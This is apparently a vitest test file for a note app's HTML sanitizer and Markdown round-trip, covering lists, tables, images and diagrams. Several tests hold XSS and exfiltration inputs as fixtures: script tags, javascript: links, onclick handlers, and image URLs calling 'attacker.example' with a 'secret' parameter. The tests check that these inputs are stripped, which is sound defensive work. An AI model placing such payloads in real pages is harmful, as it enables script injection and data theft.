import { describe, expect, it } from 'vitest';

import { htmlToMarkdown } from '@knowtis/note-markdown';

import { nodesLostBetween } from './document-fidelity';
import {
  htmlToPlainText,
  markdownToNoteHtml,
  sanitizeNoteHtml,
} from './html-sanitizer';
import {
  AI_BLOCK_HTML,
  collectNodesOfType,
  collectTypes,
  EDITOR_VOCABULARY_MARKDOWN,
  persistedDocument,
  storedHtml,
} from './html-sanitizer.fixtures';

const LOOSE_TASK_LIST_MARKDOWN = [
  '- [x] passport',
  '- [ ] visa',
  '',
  '  needs photo',
  '- [x] tickets',
].join('\n');

const STORED_IMAGE =
  'https://knowtis.public.blob.vercel-storage.com/notes/n1/lake.webp';
const LONE_FIGURE = `<figure data-image=""><img src="${STORED_IMAGE}" alt="a"><figcaption></figcaption></figure>`;

const DIAGRAM = '<div data-mermaid-block data-code="graph TD"></div>';

const taskList = (...items: string[]) =>
  `<ul data-type="taskList">${items.join('')}</ul>`;
const taskItem = (body: string, checked = false) =>
  `<li data-type="taskItem" data-checked="${checked}"><div>${body}</div></li>`;

describe('markdownToNoteHtml', () => {
  it('renders basic markdown to html', () => {
    const html = markdownToNoteHtml('# Title\n\nHello **world**');
    expect(html).toContain('<h1>Title</h1>');
    expect(html).toContain('<strong>world</strong>');
  });

  it('strips raw script tags', () => {
    const html = markdownToNoteHtml('Hi <script>alert(1)</script>');
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('alert(1)</script>');
  });

  it('neutralizes javascript: link hrefs but keeps visible text', () => {
    const html = markdownToNoteHtml('[click](javascript:alert(1))');
    expect(html).toContain('click');
    expect(html).not.toMatch(/href="javascript:/i);
  });

  it('preserves the literal word "javascript:" in prose', () => {
    expect(markdownToNoteHtml('Use the javascript: scheme')).toContain(
      'javascript:'
    );
  });

  it('returns empty string for empty/whitespace input', () => {
    expect(markdownToNoteHtml('   ')).toBe('');
  });

  it('renders a mermaid fence as a mermaid block the editor can parse', () => {
    const html = markdownToNoteHtml('```mermaid\nflowchart LR\n  A --> B\n```');
    expect(html).toContain('data-mermaid-block');
    expect(html).toMatch(/data-code="[^"]*flowchart LR/);
    expect(html).not.toContain('<pre>');
  });

  it('keeps the language of a non-mermaid code fence', () => {
    const html = markdownToNoteHtml('```ts\nconst a = 1;\n```');
    expect(html).toContain('class="language-ts"');
  });

  it('still drops author-supplied raw html around a mermaid fence', () => {
    const html = markdownToNoteHtml(
      '<div onclick="alert(1)">x</div>\n\n```mermaid\ngraph TD\n```'
    );
    expect(html).not.toMatch(/<div[^>]*onclick/i);
    expect(html).toContain('data-mermaid-block');
  });

  it('survives the editor persistence round-trip as a mermaidBlock node', () => {
    const json = persistedDocument(
      markdownToNoteHtml('```mermaid\nflowchart LR\n  A --> B\n```')
    );

    const [first] = json.content ?? [];
    expect(first?.type).toBe('mermaidBlock');
    expect(first?.attrs?.code).toContain('A --> B');
  });

  it('keeps an editor-authored table through the store, read and propose round trip', () => {
    const stored = storedHtml(
      '<table><tbody><tr><th><p>Day</p></th><th><p>Place</p></th></tr><tr><td><p>1</p></td><td><p>Antigua</p></td></tr></tbody></table>'
    );
    expect(stored).toContain('<colgroup>');

    const markdown = htmlToMarkdown(stored);
    expect(markdown).toBe('| Day | Place |\n| --- | --- |\n| 1 | Antigua |');

    const proposed = markdownToNoteHtml(markdown);
    expect(proposed).toContain('<th>Day</th>');
    expect(proposed).toContain('<td>Antigua</td>');
    expect(proposed).not.toContain('&lt;table');
  });

  it('keeps every construct the editor can hold through the persistence round-trip', () => {
    const json = persistedDocument(
      markdownToNoteHtml(EDITOR_VOCABULARY_MARKDOWN)
    );

    const types = [...collectTypes(json)];
    for (const expected of [
      'heading',
      'link',
      'bold',
      'table',
      'tableRow',
      'tableHeader',
      'tableCell',
      'taskList',
      'taskItem',
      'highlight',
      'subscript',
      'superscript',
      'mermaidBlock',
      'image',
    ]) {
      expect(types).toContain(expected);
    }
    expect(
      collectNodesOfType(json, 'taskItem').map(
        (item) => item.attrs?.['checked']
      )
    ).toEqual([true, false, true]);
    expect(collectNodesOfType(json, 'taskList')).toHaveLength(2);
  });

  it('is a fixed point for the whole editor vocabulary', () => {
    const stored = storedHtml(markdownToNoteHtml(EDITOR_VOCABULARY_MARKDOWN));
    const once = htmlToMarkdown(stored);
    expect(storedHtml(markdownToNoteHtml(once))).toBe(stored);
    expect(htmlToMarkdown(storedHtml(markdownToNoteHtml(once)))).toBe(once);
  });

  it('keeps the ticks of a task list a continuation paragraph made loose', () => {
    const json = persistedDocument(
      markdownToNoteHtml(LOOSE_TASK_LIST_MARKDOWN)
    );

    const types = [...collectTypes(json)];
    expect(types).toContain('taskList');
    expect(types).toContain('taskItem');
    expect(types).not.toContain('bulletList');
    expect(
      collectNodesOfType(json, 'taskItem').map(
        (item) => item.attrs?.['checked']
      )
    ).toEqual([true, false, true]);
    expect(JSON.stringify(json)).toContain('needs photo');
  });

  it('keeps a diagram inside its task item, next to the item text', () => {
    const json = persistedDocument(
      markdownToNoteHtml('- [ ] draw it\n\n  ```mermaid\n  flowchart LR\n  ```')
    );

    const [item] = collectNodesOfType(json, 'taskItem');
    expect(item?.content?.map((node) => node.type)).toEqual([
      'paragraph',
      'mermaidBlock',
    ]);
    expect(item?.content?.[0]?.content).toEqual([
      { type: 'text', text: 'draw it' },
    ]);
  });

  it('stores a task list written with numbers as the task list it is', () => {
    expect(storedHtml(markdownToNoteHtml('1. [ ] a\n2. [x] b'))).toBe(
      storedHtml(markdownToNoteHtml('- [ ] a\n- [x] b'))
    );
  });

  it.each([
    [
      'a bullet list',
      '- a\n- [ ] b',
      storedHtml(`<ul><li><p>a</p></li></ul>${taskList(taskItem('<p>b</p>'))}`),
    ],
    [
      'a numbered list',
      '1. a\n2. [ ] b',
      storedHtml(`<ol><li><p>a</p></li></ol>${taskList(taskItem('<p>b</p>'))}`),
    ],
    [
      'a numbered list that starts at three',
      '3. a\n4. [x] b\n5. c',
      storedHtml(
        `<ol start="3"><li><p>a</p></li></ol>${taskList(taskItem('<p>b</p>', true))}<ol start="5"><li><p>c</p></li></ol>`
      ),
    ],
  ])(
    'stores %s that mixes task and plain items as runs of one kind, a fixed point',
    (_kind, markdown, expected) => {
      const stored = storedHtml(markdownToNoteHtml(markdown));
      expect(stored).toBe(expected);
      const proposed = markdownToNoteHtml(htmlToMarkdown(stored));
      expect(storedHtml(proposed)).toBe(stored);
      expect(nodesLostBetween(stored, proposed)).toEqual([]);
    }
  );

  it('keeps a bare url as a link the scheme allowlist accepts', () => {
    expect(markdownToNoteHtml('See https://example.com today')).toContain(
      '<a href="https://example.com">https://example.com</a>'
    );
  });

  it('drops the style attribute markdown-it emits for aligned table columns', () => {
    const html = markdownToNoteHtml('| A |\n| :-: |\n| 1 |');
    expect(html).toContain('<th>A</th>');
    expect(html).not.toContain('style=');
  });

  it('keeps the editor figure of an image the blob store served', () => {
    const figure = `<figure data-image><img src="${STORED_IMAGE}" alt="a lake" width="320" height="200"><figcaption>Lake Atitlán</figcaption></figure>`;
    const html = sanitizeNoteHtml(figure);
    expect(html).toBe(
      `<figure data-image><img src="${STORED_IMAGE}" alt="a lake" width="320" height="200" /><figcaption>Lake Atitlán</figcaption></figure>`
    );
    expect([...collectTypes(persistedDocument(html))]).toContain('image');
  });

  it.each([
    ['another host', 'https://attacker.example/collect?d=secret'],
    ['http', 'http://knowtis.public.blob.vercel-storage.com/x.webp'],
    [
      'a look-alike host',
      'https://knowtis.public.blob.vercel-storage.com.attacker.example/x.webp',
    ],
  ])('drops an image from %s, caption included', (_label, src) => {
    const html = sanitizeNoteHtml(
      `<p>Before</p><figure data-image><img src="${src}" alt="leak"><figcaption>cap</figcaption></figure><p>After</p>`
    );
    expect(html).toBe('<p>Before</p><p>After</p>');
  });

  it('drops a bare img from another host', () => {
    expect(
      sanitizeNoteHtml('<p>x <img src="https://attacker.example/x.png"> y</p>')
    ).toBe('<p>x  y</p>');
  });

  it('drops a stored AI block, which only the editor creates', () => {
    const html = sanitizeNoteHtml(
      storedHtml(`<p>Old text.</p>${AI_BLOCK_HTML}`)
    );

    expect(html).toBe('<p>Old text.</p><div></div>');
    expect(persistedDocument(html)).toEqual({
      type: 'doc',
      content: [
        { type: 'paragraph', content: [{ type: 'text', text: 'Old text.' }] },
      ],
    });
  });

  it('renders an image written in Markdown as the figure the editor parses', () => {
    const html = markdownToNoteHtml(
      `![a lake](${STORED_IMAGE} "Lake Atitlán")`
    );
    expect(html).toBe(
      `<figure data-image><img src="${STORED_IMAGE}" alt="a lake" /><figcaption>Lake Atitlán</figcaption></figure>`
    );
  });

  it('drops an image written in Markdown with a foreign url, caption included', () => {
    const html = markdownToNoteHtml(
      'Before\n\n![leak](https://attacker.example/c?d=1 "cap")\n\nAfter'
    );
    expect(html).toBe('<p>Before</p>\n\n<p>After</p>');
  });

  it.each([
    [
      'a bullet item',
      `- ![a](${STORED_IMAGE})`,
      `<ul><li><p></p>${LONE_FIGURE}</li></ul>`,
    ],
    [
      'a numbered item',
      `1. ![a](${STORED_IMAGE})`,
      `<ol><li><p></p>${LONE_FIGURE}</li></ol>`,
    ],
    [
      'a task item',
      `- [ ] ![a](${STORED_IMAGE})`,
      `<ul data-type="taskList"><li data-checked="false" data-type="taskItem"><label><input type="checkbox"><span></span></label><div><p></p>${LONE_FIGURE}</div></li></ul>`,
    ],
    [
      'a bullet item, above its caption',
      `- ![a](${STORED_IMAGE}) caption`,
      `<ul><li><p></p>${LONE_FIGURE}<p>caption</p></li></ul>`,
    ],
    [
      'a bullet item, beside a second image',
      `- ![a](${STORED_IMAGE}) ![a](${STORED_IMAGE})`,
      `<ul><li><p></p>${LONE_FIGURE}${LONE_FIGURE}</li></ul>`,
    ],
  ])(
    'keeps the image that opens %s inside it, as a fixed point',
    (_kind, markdown, expected) => {
      const stored = storedHtml(markdownToNoteHtml(markdown));
      expect(stored).toBe(expected);
      expect(storedHtml(markdownToNoteHtml(htmlToMarkdown(stored)))).toBe(
        stored
      );
    }
  );

  it('stores an image written mid-sentence as its own block', () => {
    const stored = storedHtml(
      markdownToNoteHtml(`See ![map](${STORED_IMAGE}) here.`)
    );
    expect(stored).toBe(
      `<p>See</p><figure data-image=""><img src="${STORED_IMAGE}" alt="map"><figcaption></figcaption></figure><p>here.</p>`
    );
  });

  it('drops an event handler smuggled into a table cell', () => {
    const html = markdownToNoteHtml(
      '| A |\n| --- |\n| <td onclick="alert(1)">x</td> |'
    );
    expect(html).not.toMatch(/<[a-z]+[^>]*onclick/i);
  });

  it('keeps the first number of an ordered list that does not start at one', () => {
    expect(markdownToNoteHtml('3. three\n4. four')).toContain('<ol start="3">');
  });

  it('drops a protocol-relative href, which no allowed scheme covers', () => {
    const html = markdownToNoteHtml('[pr](//evil.com) and //evil.com/x');
    expect(html).toContain('pr');
    expect(html).not.toMatch(/href="\/\//);
  });
});

describe('the round trip of a stored note', () => {
  it.each([
    [
      'a code block with no trailing newline',
      storedHtml('<pre><code>x</code></pre>'),
    ],
    [
      'a code block ending in a newline',
      storedHtml('<pre><code>x\n</code></pre>'),
    ],
    [
      'a code block ending in a blank line',
      storedHtml('<pre><code>x\n\n</code></pre>'),
    ],
    [
      'a typed code block ending in a newline',
      storedHtml('<pre><code class="language-ts">const a = 1;\n</code></pre>'),
    ],
    ['an empty code block', storedHtml('<pre><code></code></pre>')],
    ['an empty quote', storedHtml('<p>a</p><blockquote><p></p></blockquote>')],
    ['an empty task item', storedHtml(taskList(taskItem('<p></p>')))],
    [
      'an empty ticked task item',
      storedHtml(taskList(taskItem('<p></p>', true))),
    ],
    [
      'an empty task item between two others',
      storedHtml(
        taskList(
          taskItem('<p>a</p>'),
          taskItem('<p></p>'),
          taskItem('<p>b</p>', true)
        )
      ),
    ],
    [
      'an empty task item holding a sublist',
      storedHtml(
        taskList(taskItem(`<p></p>${taskList(taskItem('<p>b</p>', true))}`))
      ),
    ],
    [
      'an empty task item two levels down',
      storedHtml(
        taskList(taskItem(`<p>a</p>${taskList(taskItem('<p></p>'))}`))
      ),
    ],
    [
      'an empty task item holding code',
      storedHtml(
        taskList(taskItem('<p></p><pre><code>x\n\n- [ ] y</code></pre>'))
      ),
    ],
    [
      'an empty task item holding a paragraph',
      storedHtml(taskList(taskItem('<p></p><p>later</p>'))),
    ],
    [
      'an empty task item holding a bullet list',
      storedHtml(taskList(taskItem('<p></p><ul><li><p>b</p></li></ul>'))),
    ],
    [
      'an empty task item holding an image',
      storedHtml(taskList(taskItem(`<p></p>${LONE_FIGURE}`))),
    ],
    [
      'an empty task item holding a diagram',
      storedHtml(taskList(taskItem(`<p></p>${DIAGRAM}`))),
    ],
    [
      'a quote holding only a diagram',
      storedHtml(`<blockquote>${DIAGRAM}</blockquote>`),
    ],
    [
      'a bullet holding only a sublist',
      storedHtml('<ul><li><p></p><ul><li><p>b</p></li></ul></li></ul>'),
    ],
    [
      'a bullet holding only a diagram',
      storedHtml(`<ul><li><p></p>${DIAGRAM}</li></ul>`),
    ],
    [
      'an empty last bullet',
      storedHtml('<ul><li><p>a</p></li><li><p></p></li></ul>'),
    ],
    [
      'an empty bullet between two others',
      storedHtml('<ul><li><p>a</p></li><li><p></p></li><li><p>b</p></li></ul>'),
    ],
    ['a list of one empty bullet', storedHtml('<ul><li><p></p></li></ul>')],
    [
      'an empty bullet one level down',
      storedHtml('<ul><li><p>a</p><ul><li><p></p></li></ul></li></ul>'),
    ],
    [
      'an empty numbered item',
      storedHtml('<ol><li><p>a</p></li><li><p></p></li></ol>'),
    ],
    [
      'an image and its caption written in a tight bullet',
      storedHtml(markdownToNoteHtml(`- ![a](${STORED_IMAGE}) caption`)),
    ],
    [
      'two images written in a tight bullet',
      storedHtml(
        markdownToNoteHtml(`- ![a](${STORED_IMAGE}) ![a](${STORED_IMAGE})`)
      ),
    ],
    [
      'an image written mid-sentence',
      storedHtml(markdownToNoteHtml(`See ![a](${STORED_IMAGE}) here.`)),
    ],
    [
      'an image written before its text',
      storedHtml(markdownToNoteHtml(`![a](${STORED_IMAGE}) here`)),
    ],
    [
      'an image and its caption written in a loose list item',
      storedHtml(markdownToNoteHtml(`- ![a](${STORED_IMAGE}) caption\n\n- b`)),
    ],
    [
      'an image and its caption written in a task item',
      storedHtml(markdownToNoteHtml(`- [ ] ![a](${STORED_IMAGE}) caption`)),
    ],
    [
      'an image written beside text in a quote',
      storedHtml(markdownToNoteHtml(`> See ![a](${STORED_IMAGE}) here.`)),
    ],
    [
      'a task list written with numbers',
      storedHtml(markdownToNoteHtml('1. [ ] a\n2. [x] b')),
    ],
    [
      'a bullet list followed by a task list',
      storedHtml(`<ul><li><p>a</p></li></ul>${taskList(taskItem('<p>b</p>'))}`),
    ],
    [
      'a task list between two parts of one numbered list',
      storedHtml(
        `<ol><li><p>a</p></li></ol>${taskList(taskItem('<p>b</p>'))}<ol start="2"><li><p>c</p></li></ol>`
      ),
    ],
    [
      'a bullet holding a task list, followed by a task list',
      storedHtml(
        `<ul><li><p>a</p>${taskList(taskItem('<p>b</p>'))}</li></ul>${taskList(taskItem('<p>c</p>'))}`
      ),
    ],
    [
      'a task item holding a bullet list followed by a task list',
      storedHtml(
        taskList(
          taskItem(
            `<p>a</p><ul><li><p>b</p></li></ul>${taskList(taskItem('<p>c</p>'))}`
          )
        )
      ),
    ],
    [
      'a blank line between two paragraphs',
      storedHtml('<p>a</p><p></p><p>b</p>'),
    ],
    ['two blank lines in a row', storedHtml('<p>a</p><p></p><p></p><p>b</p>')],
    ['a blank first and last line', storedHtml('<p></p><p>a</p><p></p>')],
    [
      'a blank line inside a quote',
      storedHtml('<blockquote><p>a</p><p></p><p>b</p></blockquote>'),
    ],
    [
      'a blank line inside a list item, after its text',
      storedHtml('<ul><li><p>a</p><p></p></li><li><p>b</p></li></ul>'),
    ],
    [
      'a list item whose first line is blank, above its text',
      storedHtml('<ul><li><p></p><p>a</p></li></ul>'),
    ],
    [
      'a blank line inside a task item, after its text',
      storedHtml(taskList(taskItem('<p>a</p><p></p>'))),
    ],
    [
      'a paragraph opening and ending with a non-breaking space',
      storedHtml('<p>&nbsp;a&nbsp;</p><p>b&nbsp;</p>'),
    ],
    [
      'a heading opening and ending with a non-breaking space',
      storedHtml(
        '<h2>&nbsp;a&nbsp;</h2><h3>&nbsp;</h3><p>b</p><h2>c&nbsp;</h2>'
      ),
    ],
    [
      'a list item whose text ends with a non-breaking space',
      storedHtml('<ul><li><p>&nbsp;a&nbsp;</p></li><li><p>b</p></li></ul>'),
    ],
    [
      'a task item whose text opens with a non-breaking space',
      storedHtml(taskList(taskItem('<p>&nbsp;a&nbsp;</p>'))),
    ],
    [
      'a quote whose text opens with a non-breaking space',
      storedHtml('<blockquote><p>&nbsp;a</p></blockquote>'),
    ],
    [
      'a table cell holding only a non-breaking space',
      storedHtml(
        '<table><tbody><tr><th><p>h</p></th><th><p>&nbsp;i</p></th></tr><tr><td><p>&nbsp;</p></td><td><p>x&nbsp;</p></td></tr></tbody></table>'
      ),
    ],
    [
      'an image whose caption opens with a non-breaking space',
      storedHtml(
        `<figure data-image=""><img src="${STORED_IMAGE}" alt="&nbsp;a"><figcaption>&nbsp;cap&nbsp;</figcaption></figure>`
      ),
    ],
    [
      'a paragraph holding only a line break',
      storedHtml('<p>a</p><p><br></p><p>b</p>'),
    ],
    ['a paragraph that ends with a line break', storedHtml('<p>a<br></p>')],
    ['a paragraph that opens with a line break', storedHtml('<p><br>a</p>')],
    [
      'a paragraph ending with a non-breaking space after bold text',
      storedHtml('<p><strong>a</strong>&nbsp;</p>'),
    ],
    [
      'a paragraph whose first line is a non-breaking space',
      storedHtml('<p>&nbsp;<br>a</p>'),
    ],
    [
      'a paragraph holding two breaks in a row',
      storedHtml('<p>a<br><br>b</p>'),
    ],
    ['a paragraph of two line breaks', storedHtml('<p><br><br></p>')],
    [
      'a list item that ends with a line break',
      storedHtml('<ul><li><p>a<br></p></li><li><p>b</p></li></ul>'),
    ],
    [
      'a task item that opens with a line break',
      storedHtml(taskList(taskItem('<p><br>a</p>'))),
    ],
    [
      'a task item ending with a line break, above a sublist',
      storedHtml(
        taskList(taskItem(`<p>a<br></p>${taskList(taskItem('<p>b</p>'))}`))
      ),
    ],
    [
      'a quote that ends with a line break',
      storedHtml('<blockquote><p>a<br></p></blockquote>'),
    ],
    ['an empty h1', storedHtml('<h1></h1><p>a</p>')],
    ['an empty h3', storedHtml('<p>a</p><h3></h3>')],
    [
      'a paragraph holding a non-breaking space between words',
      storedHtml('<p>a&nbsp;b</p>'),
    ],
    [
      'a paragraph whose text reads as an HTML entity',
      storedHtml('<p>&amp;nbsp; &amp;copy; AT&amp;T</p>'),
    ],
    [
      'an image whose alt and caption read as Markdown',
      storedHtml(
        `<figure data-image=""><img src="${STORED_IMAGE}" alt="&amp;copy; a [b] c &quot;q&quot; \\ *x* \`y\`"><figcaption>&amp;copy; a [b] c "q" \\ *x* \`y\`</figcaption></figure>`
      ),
    ],
    [
      'a bullet whose text is a literal [ ]',
      storedHtml('<ul><li><p>[ ]</p></li><li><p>[x]</p></li></ul>'),
    ],
  ])('keeps %s as it was', (_shape, stored) => {
    const proposed = markdownToNoteHtml(htmlToMarkdown(stored));
    expect(storedHtml(proposed)).toBe(stored);
    expect(nodesLostBetween(stored, proposed)).toEqual([]);
  });
});

describe('htmlToPlainText', () => {
  it('strips tags keeping the text content', () => {
    expect(htmlToPlainText('<p>do <strong>it</strong> now</p>')).toBe(
      'do it now'
    );
  });

  it('separates block elements with line breaks', () => {
    expect(htmlToPlainText('<p>first</p><p>second</p>')).toBe('first\nsecond');
    expect(htmlToPlainText('<ul><li>one</li><li>two</li></ul>')).toBe(
      'one\ntwo'
    );
  });

  it('treats <br> as a line break', () => {
    expect(htmlToPlainText('<p>line one<br>line two</p>')).toBe(
      'line one\nline two'
    );
  });

  it('decodes common html entities', () => {
    expect(
      htmlToPlainText('<p>Tom &amp; Jerry &lt;3 &quot;cats&quot;</p>')
    ).toBe('Tom & Jerry <3 "cats"');
  });

  it('drops script content entirely', () => {
    expect(htmlToPlainText('<p>safe</p><script>alert(1)</script>')).toBe(
      'safe'
    );
  });

  it('keeps the source of a mermaid diagram, which lives in an attribute', () => {
    const plain = htmlToPlainText(
      '<div data-code="flowchart LR&#10;  A --&gt; B" data-view-mode="split" data-mermaid-block=""></div>'
    );
    expect(plain).toContain('flowchart LR');
    expect(plain).toContain('A --> B');
  });

  it('returns empty string for empty or whitespace input', () => {
    expect(htmlToPlainText('')).toBe('');
    expect(htmlToPlainText('  \n ')).toBe('');
  });
});
